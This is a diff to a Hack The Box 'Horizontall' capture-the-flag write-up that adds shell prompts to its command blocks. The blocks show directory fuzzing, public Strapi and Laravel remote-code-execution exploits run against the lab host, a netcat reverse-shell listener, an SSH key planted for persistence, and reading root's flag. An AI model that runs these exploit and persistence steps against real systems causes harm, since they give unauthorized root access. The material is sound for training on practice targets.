@@ -106,7 +106,8 @@ http://api-prod.horizontall.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServ
 ![Firefox - Subdomain Page](./assets/screenshots/hackthebox_horizontall_firefox_subdomain_page.png)
 
 ```
-ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://api-prod.horizontall.htb/FUZZ -ic -t 20
+┌──(nabla㉿kali)-[~]
+└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://api-prod.horizontall.htb/FUZZ -ic -t 20
 
 [SNIP]
 
@@ -118,7 +119,8 @@ admin                   [Status: 200, Size: 854, Words: 98, Lines: 17, Duration:
 ![Firefox - Reviews Page](./assets/screenshots/hackthebox_horizontall_firefox_reviews_page.png)
 
 ```
-ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://api-prod.horizontall.htb/admin/FUZZ -ic -t 20
+┌──(nabla㉿kali)-[~]
+└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://api-prod.horizontall.htb/admin/FUZZ -ic -t 20
 
 [SNIP]
 
@@ -128,7 +130,8 @@ init                    [Status: 200, Size: 144, Words: 1, Lines: 1, Duration: 1
 ```
 
 ```
-curl http://api-prod.horizontall.htb/admin/init
+┌──(nabla㉿kali)-[~]
+└─$ curl http://api-prod.horizontall.htb/admin/init
 
 {"data":{"uuid":"a55da3bd-9693-4a08-9279-f9df57fd1817","currentEnvironment":"development","autoReload":false,"strapiVersion":"3.0.0-beta.17.4"}}
 ```
@@ -136,7 +139,8 @@ curl http://api-prod.horizontall.htb/admin/init
 **CVE-2019-18818 + CVE-2019-19609**
 
 ```
-searchsploit strapi --json | jq '.RESULTS_EXPLOIT[] | {Title, Codes, Path}'
+┌──(nabla㉿kali)-[~]
+└─$ searchsploit strapi --json | jq '.RESULTS_EXPLOIT[] | {Title, Codes, Path}'
 
 [SNIP]
 
@@ -148,7 +152,8 @@ searchsploit strapi --json | jq '.RESULTS_EXPLOIT[] | {Title, Codes, Path}'
 ```
 
 ```
-cat /usr/share/exploitdb/exploits/multiple/webapps/50239.py
+┌──(nabla㉿kali)-[~]
+└─$ cat /usr/share/exploitdb/exploits/multiple/webapps/50239.py
 
 # Exploit Title: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)
 # Date: 2021-08-30
@@ -172,7 +177,8 @@ if __name__ == ("__main__"):
 ```
 
 ```
-python3 /usr/share/exploitdb/exploits/multiple/webapps/50239.py http://api-prod.horizontall.htb
+┌──(nabla㉿kali)-[~]
+└─$ python3 /usr/share/exploitdb/exploits/multiple/webapps/50239.py http://api-prod.horizontall.htb
 
 [+] Checking Strapi CMS Version running
 [+] Seems like the exploit will work!!!
@@ -194,7 +200,8 @@ $> whoami
 ```
 
 ```
-nc -lvnp 1234
+┌──(nabla㉿kali)-[~]
+└─$ nc -lvnp 1234
 
 listening on [any] 1234 ...
 
@@ -346,7 +353,8 @@ strapi:x:1001:1001::/opt/strapi:/bin/sh
 **Port Forwarding**
  
 ```
-ssh-keygen -f strapi
+┌──(nabla㉿kali)-[~]
+└─$ ssh-keygen -f strapi
 
 [SNIP]
 
@@ -365,7 +373,8 @@ The key's randomart image is:
 ```
 
 ```
-ls -l strapi*
+┌──(nabla㉿kali)-[~]
+└─$ ls -l strapi*
 
 -rw------- 1 nvbla nvbla 2610 Jun 24 11:04 strapi
 -rw-r--r-- 1 nvbla nvbla  574 Jun 24 11:04 strapi.pub
@@ -390,7 +399,8 @@ strapi@horizontall:~$ chmod 600 authorized_keys
 ```
 
 ```
-ssh -i strapi strapi@horizontall.htb
+┌──(nabla㉿kali)-[~]
+└─$ ssh -i strapi strapi@horizontall.htb
 
 Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)
 
@@ -400,11 +410,13 @@ $
 ```
 
 ```
-ssh -L 8000:127.0.0.1:8000 -i strapi strapi@horizontall.htb
+┌──(nabla㉿kali)-[~]
+└─$ ssh -L 8000:127.0.0.1:8000 -i strapi strapi@horizontall.htb
 ```
 
 ```
-sudo nmap -sSV -p8000 localhost -T5
+┌──(nabla㉿kali)-[~]
+└─$ sudo nmap -sSV -p8000 localhost -T5
 
 [SNIP]
 
@@ -413,7 +425,8 @@ PORT     STATE SERVICE VERSION
 ```
 
 ```
-whatweb http://localhost:8000/
+┌──(nabla㉿kali)-[~]
+└─$ whatweb http://localhost:8000/
 
 http://localhost:8000/ [200 OK] Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HttpOnly[laravel_session], IP[127.0.0.1], Laravel, PHP[7.4.22], Title[Laravel], X-Powered-By[PHP/7.4.22]
 ```
@@ -421,7 +434,8 @@ http://localhost:8000/ [200 OK] Cookies[XSRF-TOKEN,laravel_session], Country[RES
 ![Firefox - Internal Port Homepage](./assets/screenshots/hackthebox_horizontall_firefox_internal_port_homepage.png)
 
 ```
-ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://localhost:8000/FUZZ -ic -t 20
+┌──(nabla㉿kali)-[~]
+└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://localhost:8000/FUZZ -ic -t 20
 
 [SNIP]
 
@@ -433,7 +447,8 @@ profiles                [Status: 500, Size: 616236, Words: 32882, Lines: 248, Du
 ![Firefox - Internal Port Profiles Page](./assets/screenshots/hackthebox_horizontall_firefox_internal_port_profiles_page.png)
 
 ```
-searchsploit laravel --json | jq '.RESULTS_EXPLOIT[] | {Title, Codes, Path}'
+┌──(nabla㉿kali)-[~]
+└─$ searchsploit laravel --json | jq '.RESULTS_EXPLOIT[] | {Title, Codes, Path}'
 
 [SNIP]
 
@@ -442,12 +457,11 @@ searchsploit laravel --json | jq '.RESULTS_EXPLOIT[] | {Title, Codes, Path}'
   "Codes": "CVE-2021-3129",
   "Path": "/usr/share/exploitdb/exploits/php/webapps/49424.py"
 }
-
-[SNIP]
 ```
 
 ```
-cat /usr/share/exploitdb/exploits/php/webapps/49424.py
+┌──(nabla㉿kali)-[~]
+└─$ cat /usr/share/exploitdb/exploits/php/webapps/49424.py
 
 # Exploit Title: Laravel 8.4.2 debug mode - Remote code execution
 # Date: 1.14.2021
@@ -470,7 +484,8 @@ cat /usr/share/exploitdb/exploits/php/webapps/49424.py
 ```
 
 ```
-python3 /usr/share/exploitdb/exploits/php/webapps/49424.py
+┌──(nabla㉿kali)-[~]
+└─$ python3 /usr/share/exploitdb/exploits/php/webapps/49424.py
 
 Usage:  /usr/share/exploitdb/exploits/php/webapps/49424.py url path-log command
 
@@ -478,7 +493,8 @@ Usage:  /usr/share/exploitdb/exploits/php/webapps/49424.py url path-log command
 ```
 
 ```
-python3 /usr/share/exploitdb/exploits/php/webapps/49424.py http://localhost:8000 /var/www/html/laravel/storage/logs/laravel.log 'id'
+┌──(nabla㉿kali)-[~]
+└─$ python3 /usr/share/exploitdb/exploits/php/webapps/49424.py http://localhost:8000 /var/www/html/laravel/storage/logs/laravel.log 'id'
 
 [SNIP]
 
@@ -490,7 +506,8 @@ requests.exceptions.ConnectionError: ('Connection aborted.', RemoteDisconnected(
 ![Firefox - CVE-2021-3129 POC 2](./assets/screenshots/hackthebox_horizontall_firefox_cve20213129_2.png)
 
 ```
-python3 /usr/share/exploitdb/exploits/php/webapps/49424.py http://localhost:8000 ../storage/logs/laravel.log id
+┌──(nabla㉿kali)-[~]
+└─$ python3 /usr/share/exploitdb/exploits/php/webapps/49424.py http://localhost:8000 ../storage/logs/laravel.log id
 
 [SNIP]
 
@@ -498,7 +515,8 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 
 ```
-python3 /usr/share/exploitdb/exploits/php/webapps/49424.py http://localhost:8000 ../storage/logs/laravel.log 'cat /root/root.txt'
+┌──(nabla㉿kali)-[~]
+└─$ python3 /usr/share/exploitdb/exploits/php/webapps/49424.py http://localhost:8000 ../storage/logs/laravel.log 'cat /root/root.txt'
 
 [SNIP]
 
